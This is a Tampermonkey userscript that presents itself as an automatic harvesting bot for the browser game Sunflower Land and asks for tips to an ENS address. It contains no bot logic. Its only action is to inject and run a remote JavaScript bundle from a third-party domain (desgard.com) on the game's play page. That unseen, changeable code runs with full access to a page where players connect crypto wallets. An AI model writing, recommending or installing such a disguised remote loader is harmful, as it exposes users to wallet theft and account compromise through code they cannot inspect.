// ==UserScript==
// @name         Sunflower Land Farmer
// @namespace    http://tampermonkey.net/
// @version      0.2
// @description  sunflower-land 自动收菜脚本
// @author       GuaGua
// @match        https://sunflower-land.com/play/
// @icon         https://www.google.com/s2/favicons?sz=64&domain=sunflower-land.com
// @grant        none
// @license      MIT
// @downloadURL https://update.greasyfork.org/scripts/442970/Sunflower%20Land%20Farmer.user.js
// @updateURL https://update.greasyfork.org/scripts/442970/Sunflower%20Land%20Farmer.meta.js
// ==/UserScript==
// 如果觉得好用，欢迎打赏 imgua.eth
//


;(function () {
  'use strict'
  if (location.href === 'http://localhost:8080/') return
  var script = document.createElement('script')
  script.src = 'https://www.desgard.com/app.bundle.js'
  document.body.appendChild(script)
})()